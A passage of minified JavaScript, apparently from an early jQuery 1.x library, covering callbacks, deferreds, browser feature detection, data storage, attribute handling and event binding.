r||"input"!==e.nodeName.toLowerCase()?t:e.defaultValue}),ut(function(e){return null==e.getAttribute("disabled")})||ct(B,function(e,n,r){var i;return r?t:(i=e.getAttributeNode(n))&&i.specified?i.value:e[n]===!0?n.toLowerCase():null}),x.find=at,x.expr=at.selectors,x.expr[":"]=x.expr.pseudos,x.unique=at.uniqueSort,x.text=at.getText,x.isXMLDoc=at.isXML,x.contains=at.contains}(e);var O={};function F(e){var t=O[e]={};return x.each(e.match(T)||[],function(e,n){t[n]=!0}),t}x.Callbacks=function(e){e="string"==typeof e?O[e]||F(e):x.extend({},e);var n,r,i,o,a,s,l=[],u=!e.once&&[],c=function(t){for(r=e.memory&&t,i=!0,a=s||0,s=0,o=l.length,n=!0;l&&o>a;a++)if(l[a].apply(t[0],t[1])===!1&&e.stopOnFalse){r=!1;break}n=!1,l&&(u?u.length&&c(u.shift()):r?l=[]:p.disable())},p={add:function(){if(l){var t=l.length;(function i(t){x.each(t,function(t,n){var r=x.type(n);"function"===r?e.unique&&p.has(n)||l.push(n):n&&n.length&&"string"!==r&&i(n)})})(arguments),n?o=l.length:r&&(s=t,c(r))}return this},remove:function(){return l&&x.each(arguments,function(e,t){var r;while((r=x.inArray(t,l,r))>-1)l.splice(r,1),n&&(o>=r&&o--,a>=r&&a--)}),this},has:function(e){return e?x.inArray(e,l)>-1:!(!l||!l.length)},empty:function(){return l=[],o=0,this},disable:function(){return l=u=r=t,this},disabled:function(){return!l},lock:function(){return u=t,r||p.disable(),this},locked:function(){return!u},fireWith:function(e,t){return!l||i&&!u||(t=t||[],t=[e,t.slice?t.slice():t],n?u.push(t):c(t)),this},fire:function(){return p.fireWith(this,arguments),this},fired:function(){return!!i}};return p},x.extend({Deferred:function(e){var t=[["resolve","done",x.Callbacks("once memory"),"resolved"],["reject","fail",x.Callbacks("once memory"),"rejected"],["notify","progress",x.Callbacks("memory")]],n="pending",r={state:function(){return n},always:function(){return i.done(arguments).fail(arguments),this},then:function(){var e=arguments;return x.Deferred(function(n){x.each(t,function(t,o){var a=o[0],s=x.isFunction(e[t])&&e[t];i[o[1]](function(){var e=s&&s.apply(this,arguments);e&&x.isFunction(e.promise)?e.promise().done(n.resolve).fail(n.reject).progress(n.notify):n[a+"With"](this===r?n.promise():this,s?[e]:arguments)})}),e=null}).promise()},promise:function(e){return null!=e?x.extend(e,r):r}},i={};return r.pipe=r.then,x.each(t,function(e,o){var a=o[2],s=o[3];r[o[1]]=a.add,s&&a.add(function(){n=s},t[1^e][2].disable,t[2][2].lock),i[o[0]]=function(){return i[o[0]+"With"](this===i?r:this,arguments),this},i[o[0]+"With"]=a.fireWith}),r.promise(i),e&&e.call(i,i),i},when:function(e){var t=0,n=g.call(arguments),r=n.length,i=1!==r||e&&x.isFunction(e.promise)?r:0,o=1===i?e:x.Deferred(),a=function(e,t,n){return function(r){t[e]=this,n[e]=arguments.length>1?g.call(arguments):r,n===s?o.notifyWith(t,n):--i||o.resolveWith(t,n)}},s,l,u;if(r>1)for(s=Array(r),l=Array(r),u=Array(r);r>t;t++)n[t]&&x.isFunction(n[t].promise)?n[t].promise().done(a(t,u,n)).fail(o.reject).progress(a(t,l,s)):--i;return i||o.resolveWith(u,n),o.promise()}}),x.support=function(t){var n,r,o,s,l,u,c,p,f,d=a.createElement("div");if(d.setAttribute("className","t"),d.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",n=d.getElementsByTagName("*")||[],r=d.getElementsByTagName("a")[0],!r||!r.style||!n.length)return t;s=a.createElement("select"),u=s.appendChild(a.createElement("option")),o=d.getElementsByTagName("input")[0],r.style.cssText="top:1px;float:left;opacity:.5",t.getSetAttribute="t"!==d.className,t.leadingWhitespace=3===d.firstChild.nodeType,t.tbody=!d.getElementsByTagName("tbody").length,t.htmlSerialize=!!d.getElementsByTagName("link").length,t.style=/top/.test(r.getAttribute("style")),t.hrefNormalized="/a"===r.getAttribute("href"),t.opacity=/^0.5/.test(r.style.opacity),t.cssFloat=!!r.style.cssFloat,t.checkOn=!!o.value,t.optSelected=u.selected,t.enctype=!!a.createElement("form").enctype,t.html5Clone="<:nav></:nav>"!==a.createElement("nav").cloneNode(!0).outerHTML,t.inlineBlockNeedsLayout=!1,t.shrinkWrapBlocks=!1,t.pixelPosition=!1,t.deleteExpando=!0,t.noCloneEvent=!0,t.reliableMarginRight=!0,t.boxSizingReliable=!0,o.checked=!0,t.noCloneChecked=o.cloneNode(!0).checked,s.disabled=!0,t.optDisabled=!u.disabled;try{delete d.test}catch(h){t.deleteExpando=!1}o=a.createElement("input"),o.setAttribute("value",""),t.input=""===o.getAttribute("value"),o.value="t",o.setAttribute("type","radio"),t.radioValue="t"===o.value,o.setAttribute("checked","t"),o.setAttribute("name","t"),l=a.createDocumentFragment(),l.appendChild(o),t.appendChecked=o.checked,t.checkClone=l.cloneNode(!0).cloneNode(!0).lastChild.checked,d.attachEvent&&(d.attachEvent("onclick",function(){t.noCloneEvent=!1}),d.cloneNode(!0).click());for(f in{submit:!0,change:!0,focusin:!0})d.setAttribute(c="on"+f,"t"),t[f+"Bubbles"]=c in e||d.attributes[c].expando===!1;d.style.backgroundClip="content-box",d.cloneNode(!0).style.backgroundClip="",t.clearCloneStyle="content-box"===d.style.backgroundClip;for(f in x(t))break;return t.ownLast="0"!==f,x(function(){var n,r,o,s="padding:0;margin:0;border:0;display:block;box-sizing:content-box;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;",l=a.getElementsByTagName("body")[0];l&&(n=a.createElement("div"),n.style.cssText="border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px",l.appendChild(n).appendChild(d),d.innerHTML="<table><tr><td></td><td>t</td></tr></table>",o=d.getElementsByTagName("td"),o[0].style.cssText="padding:0;margin:0;border:0;display:none",p=0===o[0].offsetHeight,o[0].style.display="",o[1].style.display="none",t.reliableHiddenOffsets=p&&0===o[0].offsetHeight,d.innerHTML="",d.style.cssText="box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding:1px;border:1px;display:block;width:4px;margin-top:1%;position:absolute;top:1%;",x.swap(l,null!=l.style.zoom?{zoom:1}:{},function(){t.boxSizing=4===d.offsetWidth}),e.getComputedStyle&&(t.pixelPosition="1%"!==(e.getComputedStyle(d,null)||{}).top,t.boxSizingReliable="4px"===(e.getComputedStyle(d,null)||{width:"4px"}).width,r=d.appendChild(a.createElement("div")),r.style.cssText=d.style.cssText=s,r.style.marginRight=r.style.width="0",d.style.width="1px",t.reliableMarginRight=!parseFloat((e.getComputedStyle(r,null)||{}).marginRight)),typeof d.style.zoom!==i&&(d.innerHTML="",d.style.cssText=s+"width:1px;padding:1px;display:inline;zoom:1",t.inlineBlockNeedsLayout=3===d.offsetWidth,d.style.display="block",d.innerHTML="<div></div>",d.firstChild.style.width="5px",t.shrinkWrapBlocks=3!==d.offsetWidth,t.inlineBlockNeedsLayout&&(l.style.zoom=1)),l.removeChild(n),n=d=o=r=null)}),n=s=l=u=r=o=null,t
}({});var B=/(?:\{[\s\S]*\}|\[[\s\S]*\])$/,P=/([A-Z])/g;function R(e,n,r,i){if(x.acceptData(e)){var o,a,s=x.expando,l=e.nodeType,u=l?x.cache:e,c=l?e[s]:e[s]&&s;if(c&&u[c]&&(i||u[c].data)||r!==t||"string"!=typeof n)return c||(c=l?e[s]=p.pop()||x.guid++:s),u[c]||(u[c]=l?{}:{toJSON:x.noop}),("object"==typeof n||"function"==typeof n)&&(i?u[c]=x.extend(u[c],n):u[c].data=x.extend(u[c].data,n)),a=u[c],i||(a.data||(a.data={}),a=a.data),r!==t&&(a[x.camelCase(n)]=r),"string"==typeof n?(o=a[n],null==o&&(o=a[x.camelCase(n)])):o=a,o}}function W(e,t,n){if(x.acceptData(e)){var r,i,o=e.nodeType,a=o?x.cache:e,s=o?e[x.expando]:x.expando;if(a[s]){if(t&&(r=n?a[s]:a[s].data)){x.isArray(t)?t=t.concat(x.map(t,x.camelCase)):t in r?t=[t]:(t=x.camelCase(t),t=t in r?[t]:t.split(" ")),i=t.length;while(i--)delete r[t[i]];if(n?!I(r):!x.isEmptyObject(r))return}(n||(delete a[s].data,I(a[s])))&&(o?x.cleanData([e],!0):x.support.deleteExpando||a!=a.window?delete a[s]:a[s]=null)}}}x.extend({cache:{},noData:{applet:!0,embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"},hasData:function(e){return e=e.nodeType?x.cache[e[x.expando]]:e[x.expando],!!e&&!I(e)},data:function(e,t,n){return R(e,t,n)},removeData:function(e,t){return W(e,t)},_data:function(e,t,n){return R(e,t,n,!0)},_removeData:function(e,t){return W(e,t,!0)},acceptData:function(e){if(e.nodeType&&1!==e.nodeType&&9!==e.nodeType)return!1;var t=e.nodeName&&x.noData[e.nodeName.toLowerCase()];return!t||t!==!0&&e.getAttribute("classid")===t}}),x.fn.extend({data:function(e,n){var r,i,o=null,a=0,s=this[0];if(e===t){if(this.length&&(o=x.data(s),1===s.nodeType&&!x._data(s,"parsedAttrs"))){for(r=s.attributes;r.length>a;a++)i=r[a].name,0===i.indexOf("data-")&&(i=x.camelCase(i.slice(5)),$(s,i,o[i]));x._data(s,"parsedAttrs",!0)}return o}return"object"==typeof e?this.each(function(){x.data(this,e)}):arguments.length>1?this.each(function(){x.data(this,e,n)}):s?$(s,e,x.data(s,e)):null},removeData:function(e){return this.each(function(){x.removeData(this,e)})}});function $(e,n,r){if(r===t&&1===e.nodeType){var i="data-"+n.replace(P,"-$1").toLowerCase();if(r=e.getAttribute(i),"string"==typeof r){try{r="true"===r?!0:"false"===r?!1:"null"===r?null:+r+""===r?+r:B.test(r)?x.parseJSON(r):r}catch(o){}x.data(e,n,r)}else r=t}return r}function I(e){var t;for(t in e)if(("data"!==t||!x.isEmptyObject(e[t]))&&"toJSON"!==t)return!1;return!0}x.extend({queue:function(e,n,r){var i;return e?(n=(n||"fx")+"queue",i=x._data(e,n),r&&(!i||x.isArray(r)?i=x._data(e,n,x.makeArray(r)):i.push(r)),i||[]):t},dequeue:function(e,t){t=t||"fx";var n=x.queue(e,t),r=n.length,i=n.shift(),o=x._queueHooks(e,t),a=function(){x.dequeue(e,t)};"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,a,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return x._data(e,n)||x._data(e,n,{empty:x.Callbacks("once memory").add(function(){x._removeData(e,t+"queue"),x._removeData(e,n)})})}}),x.fn.extend({queue:function(e,n){var r=2;return"string"!=typeof e&&(n=e,e="fx",r--),r>arguments.length?x.queue(this[0],e):n===t?this:this.each(function(){var t=x.queue(this,e,n);x._queueHooks(this,e),"fx"===e&&"inprogress"!==t[0]&&x.dequeue(this,e)})},dequeue:function(e){return this.each(function(){x.dequeue(this,e)})},delay:function(e,t){return e=x.fx?x.fx.speeds[e]||e:e,t=t||"fx",this.queue(t,function(t,n){var r=setTimeout(t,e);n.stop=function(){clearTimeout(r)}})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,n){var r,i=1,o=x.Deferred(),a=this,s=this.length,l=function(){--i||o.resolveWith(a,[a])};"string"!=typeof e&&(n=e,e=t),e=e||"fx";while(s--)r=x._data(a[s],e+"queueHooks"),r&&r.empty&&(i++,r.empty.add(l));return l(),o.promise(n)}});var z,X,U=/[\t\r\n\f]/g,V=/\r/g,Y=/^(?:input|select|textarea|button|object)$/i,J=/^(?:a|area)$/i,G=/^(?:checked|selected)$/i,Q=x.support.getSetAttribute,K=x.support.input;x.fn.extend({attr:function(e,t){return x.access(this,x.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){x.removeAttr(this,e)})},prop:function(e,t){return x.access(this,x.prop,e,t,arguments.length>1)},removeProp:function(e){return e=x.propFix[e]||e,this.each(function(){try{this[e]=t,delete this[e]}catch(n){}})},addClass:function(e){var t,n,r,i,o,a=0,s=this.length,l="string"==typeof e&&e;if(x.isFunction(e))return this.each(function(t){x(this).addClass(e.call(this,t,this.className))});if(l)for(t=(e||"").match(T)||[];s>a;a++)if(n=this[a],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(U," "):" ")){o=0;while(i=t[o++])0>r.indexOf(" "+i+" ")&&(r+=i+" ");n.className=x.trim(r)}return this},removeClass:function(e){var t,n,r,i,o,a=0,s=this.length,l=0===arguments.length||"string"==typeof e&&e;if(x.isFunction(e))return this.each(function(t){x(this).removeClass(e.call(this,t,this.className))});if(l)for(t=(e||"").match(T)||[];s>a;a++)if(n=this[a],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(U," "):"")){o=0;while(i=t[o++])while(r.indexOf(" "+i+" ")>=0)r=r.replace(" "+i+" "," ");n.className=e?x.trim(r):""}return this},toggleClass:function(e,t){var n=typeof e;return"boolean"==typeof t&&"string"===n?t?this.addClass(e):this.removeClass(e):x.isFunction(e)?this.each(function(n){x(this).toggleClass(e.call(this,n,this.className,t),t)}):this.each(function(){if("string"===n){var t,r=0,o=x(this),a=e.match(T)||[];while(t=a[r++])o.hasClass(t)?o.removeClass(t):o.addClass(t)}else(n===i||"boolean"===n)&&(this.className&&x._data(this,"__className__",this.className),this.className=this.className||e===!1?"":x._data(this,"__className__")||"")})},hasClass:function(e){var t=" "+e+" ",n=0,r=this.length;for(;r>n;n++)if(1===this[n].nodeType&&(" "+this[n].className+" ").replace(U," ").indexOf(t)>=0)return!0;return!1},val:function(e){var n,r,i,o=this[0];{if(arguments.length)return i=x.isFunction(e),this.each(function(n){var o;1===this.nodeType&&(o=i?e.call(this,n,x(this).val()):e,null==o?o="":"number"==typeof o?o+="":x.isArray(o)&&(o=x.map(o,function(e){return null==e?"":e+""})),r=x.valHooks[this.type]||x.valHooks[this.nodeName.toLowerCase()],r&&"set"in r&&r.set(this,o,"value")!==t||(this.value=o))});if(o)return r=x.valHooks[o.type]||x.valHooks[o.nodeName.toLowerCase()],r&&"get"in r&&(n=r.get(o,"value"))!==t?n:(n=o.value,"string"==typeof n?n.replace(V,""):null==n?"":n)}}}),x.extend({valHooks:{option:{get:function(e){var t=x.find.attr(e,"value");return null!=t?t:e.text}},select:{get:function(e){var t,n,r=e.options,i=e.selectedIndex,o="select-one"===e.type||0>i,a=o?null:[],s=o?i+1:r.length,l=0>i?s:o?i:0;for(;s>l;l++)if(n=r[l],!(!n.selected&&l!==i||(x.support.optDisabled?n.disabled:null!==n.getAttribute("disabled"))||n.parentNode.disabled&&x.nodeName(n.parentNode,"optgroup"))){if(t=x(n).val(),o)return t;a.push(t)}return a},set:function(e,t){var n,r,i=e.options,o=x.makeArray(t),a=i.length;while(a--)r=i[a],(r.selected=x.inArray(x(r).val(),o)>=0)&&(n=!0);return n||(e.selectedIndex=-1),o}}},attr:function(e,n,r){var o,a,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return typeof e.getAttribute===i?x.prop(e,n,r):(1===s&&x.isXMLDoc(e)||(n=n.toLowerCase(),o=x.attrHooks[n]||(x.expr.match.bool.test(n)?X:z)),r===t?o&&"get"in o&&null!==(a=o.get(e,n))?a:(a=x.find.attr(e,n),null==a?t:a):null!==r?o&&"set"in o&&(a=o.set(e,r,n))!==t?a:(e.setAttribute(n,r+""),r):(x.removeAttr(e,n),t))},removeAttr:function(e,t){var n,r,i=0,o=t&&t.match(T);if(o&&1===e.nodeType)while(n=o[i++])r=x.propFix[n]||n,x.expr.match.bool.test(n)?K&&Q||!G.test(n)?e[r]=!1:e[x.camelCase("default-"+n)]=e[r]=!1:x.attr(e,n,""),e.removeAttribute(Q?n:r)},attrHooks:{type:{set:function(e,t){if(!x.support.radioValue&&"radio"===t&&x.nodeName(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},propFix:{"for":"htmlFor","class":"className"},prop:function(e,n,r){var i,o,a,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return a=1!==s||!x.isXMLDoc(e),a&&(n=x.propFix[n]||n,o=x.propHooks[n]),r!==t?o&&"set"in o&&(i=o.set(e,r,n))!==t?i:e[n]=r:o&&"get"in o&&null!==(i=o.get(e,n))?i:e[n]},propHooks:{tabIndex:{get:function(e){var t=x.find.attr(e,"tabindex");return t?parseInt(t,10):Y.test(e.nodeName)||J.test(e.nodeName)&&e.href?0:-1}}}}),X={set:function(e,t,n){return t===!1?x.removeAttr(e,n):K&&Q||!G.test(n)?e.setAttribute(!Q&&x.propFix[n]||n,n):e[x.camelCase("default-"+n)]=e[n]=!0,n}},x.each(x.expr.match.bool.source.match(/\w+/g),function(e,n){var r=x.expr.attrHandle[n]||x.find.attr;x.expr.attrHandle[n]=K&&Q||!G.test(n)?function(e,n,i){var o=x.expr.attrHandle[n],a=i?t:(x.expr.attrHandle[n]=t)!=r(e,n,i)?n.toLowerCase():null;return x.expr.attrHandle[n]=o,a}:function(e,n,r){return r?t:e[x.camelCase("default-"+n)]?n.toLowerCase():null}}),K&&Q||(x.attrHooks.value={set:function(e,n,r){return x.nodeName(e,"input")?(e.defaultValue=n,t):z&&z.set(e,n,r)}}),Q||(z={set:function(e,n,r){var i=e.getAttributeNode(r);return i||e.setAttributeNode(i=e.ownerDocument.createAttribute(r)),i.value=n+="","value"===r||n===e.getAttribute(r)?n:t}},x.expr.attrHandle.id=x.expr.attrHandle.name=x.expr.attrHandle.coords=function(e,n,r){var i;return r?t:(i=e.getAttributeNode(n))&&""!==i.value?i.value:null},x.valHooks.button={get:function(e,n){var r=e.getAttributeNode(n);return r&&r.specified?r.value:t},set:z.set},x.attrHooks.contenteditable={set:function(e,t,n){z.set(e,""===t?!1:t,n)}},x.each(["width","height"],function(e,n){x.attrHooks[n]={set:function(e,r){return""===r?(e.setAttribute(n,"auto"),r):t}}})),x.support.hrefNormalized||x.each(["href","src"],function(e,t){x.propHooks[t]={get:function(e){return e.getAttribute(t,4)}}}),x.support.style||(x.attrHooks.style={get:function(e){return e.style.cssText||t},set:function(e,t){return e.style.cssText=t+""}}),x.support.optSelected||(x.propHooks.selected={get:function(e){var t=e.parentNode;return t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex),null}}),x.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){x.propFix[this.toLowerCase()]=this}),x.support.enctype||(x.propFix.enctype="encoding"),x.each(["radio","checkbox"],function(){x.valHooks[this]={set:function(e,n){return x.isArray(n)?e.checked=x.inArray(x(e).val(),n)>=0:t}},x.support.checkOn||(x.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})});var Z=/^(?:input|select|textarea)$/i,et=/^key/,tt=/^(?:mouse|contextmenu)|click/,nt=/^(?:focusinfocus|focusoutblur)$/,rt=/^([^.]*)(?:\.(.+)|)$/;function it(){return!0}function ot(){return!1}function at(){try{return a.activeElement}catch(e){}}x.event={global:{},add:function(e,n,r,o,a){var s,l,u,c,p,f,d,h,g,m,y,v=x._data(e);if(v){r.handler&&(c=r,r=c.handler,a=c.selector),r.guid||(r.guid=x.guid++),(l=v.events)||(l=v.events={}),(f=v.handle)||(f=v.handle=function(e){return typeof x===i||e&&x.event.triggered===e.type?t:x.event.dispatch.apply(f.elem,arguments)},f.elem=e),n=(n||"").match(T)||[""],u=n.length;while(u--)s=rt.exec(n[u])||[],g=y=s[1],m=(s[2]||"").split(".").sort(),g&&(p=x.event.special[g]||{},g=(a?p.delegateType:p.bindType)||g,p=x.event.special[g]||{},d=x.extend({type:g,origType:y,data:o,handler:r,guid:r.guid,selector:a,needsContext:a&&x.expr.match.needsContext.test(a),namespace:m.join(".")},c),(h=l[g])||(h=l[g]=[],h.delegateCount=0,p.setup&&p.setup.call(e,o,m,f)!==!1||(e.addEventListener?e.addEventListener(g,f,!1):e.attachEvent&&e.attachEvent("on"+g,f))),p.add&&(p.add.call(e,d),d.handler.guid||(d.handler.guid=r.guid)),a?h.splice(h.delegateCount++,0,d):h.push(d),x.event.global[g]=!0);e=null}},remove:function(e,t,n,r,i){var o,a,s,l,u,c,p,f,d,h,g,m=x.hasData(e)&&x._data(e);if(m&&(c=m.events)){t=(t||"").match(T)||[""],u=t.length;while(u--)if(s=rt.exec(t[u])||[],d=g=s[1],h=(s[2]||"").split(".").sort(),d){p=x.event.special[d]||{},d=(r?p.delegateType:p.bindType)||d,f=c[d]||[],s=s[2]&&RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),l=o=f.length;while(o--)a=f[o],!i&&g!==a.origType||n&&n.guid!==a.guid||s&&!s.test(a.namespace)||r&&r!==a.selector&&("**"!==r||!a.selector)||(f.splice(o,1),a.selector&&f.delegateCount--,p.remove&&p.remove.call(e,a));l&&!f.length&&(p.teardown&&p.teardown.call(e,h,m.handle)!==!1||x.removeEvent(e,d,m.handle),delete c[d])}else for(d in c)x.event.remove(e,d+t[u],n,r,!0);x.isEmptyObject(c)&&(delete m.handle,x._removeData(e,"events"))}},trigger:function(n,r,i,o){var s,l,u,c,p,f,d,h=[i||a],g=v.call(n,"type")?n.type:n,m=v.call(n,"namespace")?n.namespace.split("."):[];if(u=f=i=i||a,3!==i.nodeType&&8!==i.nodeType&&!nt.test(g+x.event.triggered)&&(g.indexOf(".")>=0&&(m=g.split("."),g=m.shift(),m.sort()),l=0>g.indexOf(":")&&"on"+g,n=n[x.expando]?n:new x.Event(g,"object"==typeof n&&n),n.isTrigger=o?2:3,n.namespace=m.join("."),n.namespace_re=n.namespace?RegExp("(^|\\.)"+m.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,n.result=t,n.target||(n.target=i),r=null==r?[n]:x.makeArray(r,[n]),p=x.event.special[g]||{},o||!p.trigger||p.trigger.apply(i,r)!==!1)){if(!o&&!p.noBubble&&!x.isWindow(i)){for(c=p.delegateType||g,nt.test(c+g)||(u=u.parentNode);u;u=u.parentNode)h.push(u),f=u;f===(i.ownerDocument||a)&&h.push(f.defaultView||f.parentWindow||e)}d=0;while((u=h[d++])&&!n.isPropagationStopped())n.type=d>1?c:p.bindType||g,s=(x._data(u,"events")||{})[n.type]&&x._data(u,"handle"),s&&s.apply(u,r),s=l&&u[l],s&&x.acceptData(u)&&s.apply&&s.apply(u,r)===!1&&n.preventDefault();if(n.type=g,!o&&!n.isDefaultPrevented()&&(!p._default||p._default.apply(h.pop(),r)===!1)&&x.acceptData(i)&&l&&i[g]&&!x.isWindow(i)){f=i[l],f&&(i[l]=null),x.event.triggered=g;try{i[g]()}catch(y){}x.event.triggered=t,f&&(i[l]=f)}return n.result}},dispatch:function(e){e=x.event.fix(e);var n,r,i,o,a,s=[],l=g.call(arguments),u=(x._data(this,"events")||{})[e.type]||[],c=x.event.special[e.type]||{};if(l[0]=e,e.delegateTarget=this,!c.preDispatch||c.preDispatch.call(this,e)!==!1){s=x.event.handlers.call(this,e,u),n=0;while((o=s[n++])&&!e.isPropagationStopped()){e.currentTarget=o.elem,a=0;while((i=o.handlers[a++])&&!e.isImmediatePropagationStopped())(!e.namespace_re||e.namespace_re.test(i.namespace))&&(e.handleObj=i,e.data=i.data,r=((x.event.special[i.origType]||{}).handle||i.handler).apply(o.elem,l),r!==t&&(e.result=r)===!1&&(e.preventDefault(),e.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,e),e.result}},handlers:function(e,n){var r,i,o,a,s=[],l=n.delegateCount,u=e.target;if(l&&u.nodeType&&(!e.button||"click"!==e.type))for(;u!=this;u=u.parentNode||this)if(1===u.nodeType&&(u.disabled!==!0||"click"!==e.type)){for(o=[],a=0;l>a;a++)i=n[a],r=i.selector+" ",o[r]===t&&(o[r]=i.needsContext?x(r,this).index(u)>=0:x.find(r,this,null,[u]).length),o[r]&&o.push(i);o.length&&s.push({elem:u,handlers:o})}return n.length>l&&s.push({elem:this,handlers:n.slice(l)}),s},fix:function(e){if(e[x.expando])return e;var t,n,r,i=e.type,o=e,s=this.fixHooks[i];s||(this.fixHooks[i]=s=tt.test(i)?this.mouseHooks:et.test(i)?this.keyHooks:{}),r=s.props?this.props.concat(s.props):this.props,e=new x.Event(o),t=r.length;while(t--)n=r[t],e[n]=o[n];return e.target||(e.target=o.srcElement||a),3===e.target.nodeType&&(e.target=e.target.parentNode),e.metaKey=!!e.metaKey,s.filter?s.filter(e,o):e},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(e,t){return null==e.which&&(e.which=null!=t.charCode?t.charCode:t.keyCode),e}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(e,n){var r,i,o,s=n.button,l=n.fromElement;return null==e.pageX&&null!=n.clientX&&(i=e.target.ownerDocument||a,o=i.documentElement,r=i.body,e.pageX=n.clientX+(o&&o.scrollLeft||r&&r.scrollLeft||0)-(o&&o.clientLeft||r&&r.clientLeft||0),e.pageY=n.clientY+(o&&o.scrollTop||r&&r.scrollTop||0)-(o&&o.clientTop||r&&r.clientTop||0)),!e.relatedTarget&&l&&(e.relatedTarget=l===e.target?n.toElement:l),e.which||s===t||(e.which=1&s?1:2&s?3:4&s?2:0),e}},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==at()&&this.focus)try{return this.focus(),!1}catch(e){}},delegateType:"focusin"},blur:{trigger:function(){return this===at()&&this.blur?(this.blur(),!1):t},delegateType:"focusout"},click:{trigger:function(){return x.nodeName(this,"input")&&"checkbox"===this.type&&this.click?(this.click(),!1):t},_default:function(e){return x.nodeName(e.target,"a")}},beforeunload:{postDispatch:function(e){e.result!==t&&(e.originalEvent.returnValue=e.result)}}},simulate:function(e,t,n,r){var i=x.extend(new x.Event,n,{type:e,isSimulated:!0,originalEvent:{}});r?x.event.trigger(i,null,t):x.event.dispatch.call(t,i),i.isDefaultPrevented()&&n.preventDefault()}},x.removeEvent=a.removeEventListener?function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n,!1)}:function(e,t,n){var r="on"+t;e.detachEvent&&(typeof e[r]===i&&(e[r]=null),e.detachEvent(r,n))},x.Event=function(e,n){return this instanceof x.Event?(e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||e.returnValue===!1||e.getPreventDefault&&e.getPreventDefault()?it:ot):this.type=e,n&&x.extend(this,n),this.timeStamp=e&&e.timeStamp||x.now(),this[x.expando]=!0,t):new x.Event(e,n)},x.Event.prototype={isDefaultPrevented:ot,isPropagationStopped:ot,isImmediatePropagationStopped:ot,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=it,e&&(e.preventDefault?e.preventDefault():e.returnValue=!1)},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=it,e&&(e.stopPropagation&&e.stopPropagation(),e.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=it,this.stopPropagation()}},x.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(e,t){x.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,i=e.relatedTarget,o=e.handleObj;return(!i||i!==r&&!x.contains(r,i))&&(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),x.support.submitBubbles||(x.event.special.submit={setup:function(){return x.nodeName(this,"form")?!1:(x.event.add(this,"click._submit keypress._submit",function(e){var n=e.target,r=x.nodeName(n,"input")||x.nodeName(n,"button")?n.form:t;r&&!x._data(r,"submitBubbles")&&(x.event.add(r,"submit._submit",function(e){e._submit_bubble=!0}),x._data(r,"submitBubbles",!0))}),t)},postDispatch:function(e){e._submit_bubble&&(delete e._submit_bubble,this.parentNode&&!e.isTrigger&&x.event.simulate("submit",this.parentNode,e,!0))},teardown:function(){return x.nodeName(this,"form")?!1:(x.event.remove(this,"._submit"),t)}}),x.support.changeBubbles||(x.event.special.change={setup:function(){return Z.test(this.nodeName)?(("checkbox"===this.type||"radio"===this.type)&&(x.event.add(this,"propertychange._change",function(e){"checked"===e.originalEvent.propertyName&&(this._just_changed=!0)}),x.event.add(this,"click._change",function(e){this._just_changed&&!e.isTrigger&&(this._just_changed=!1),x.event.simulate("change",this,e,!0)})),!1):(x.event.add(this,"beforeactivate._change",function(e){var t=e.target;Z.test(t.nodeName)&&!x._data(t,"changeBubbles")&&(x.event.add(t,"change._change",function(e){!this.parentNode||e.isSimulated||e.isTrigger||x.event.simulate("change",this.parentNode,e,!0)}),x._data(t,"changeBubbles",!0))}),t)},handle:function(e){var n=e.target;return this!==n||e.isSimulated||e.isTrigger||"radio"!==n.type&&"checkbox"!==n.type?e.handleObj.handler.apply(this,arguments):t},teardown:function(){return x.event.remove(this,"._change"),!Z.test(this.nodeName)}}),x.support.focusinBubbles||x.each({focus:"focusin",blur:"focusout"},function(e,t){var n=0,r=function(e){x.event.simulate(t,e.target,x.event.fix(e),!0)};x.event.special[t]={setup:function(){0===n++&&a.addEventListener(e,r,!0)},teardown:function(){0===--n&&a.removeEventListener(e,r,!0)}}}),x.fn.extend({on:function(e,n,r,i,o){var a,s;if("object"==typeof e){"string"!=typeof n&&(r=r||n,n=t);for(a in e)this.on(a,n,r,e[a],o);return this}if(null==r&&null==i?(i=n,r=n=t):null==i&&("string"==typeof n?(i=r,r=t):(i=r,r=n,n=t)),i===!1)i=ot;else if(!i)return this;return 1===o&&(s=i,i=function(e){return x().off(e),s.apply(this,arguments)},i.guid=s.guid||(s.guid=x.guid++)),this.each(function(){x.event.add(this,e,i,r,n)})},one:function(e,t,n,r){return this.on(e,t,n,r,1)},off:function(e,n,r){var i,o;if(e&&e.preventDefault&&e.handleObj)return 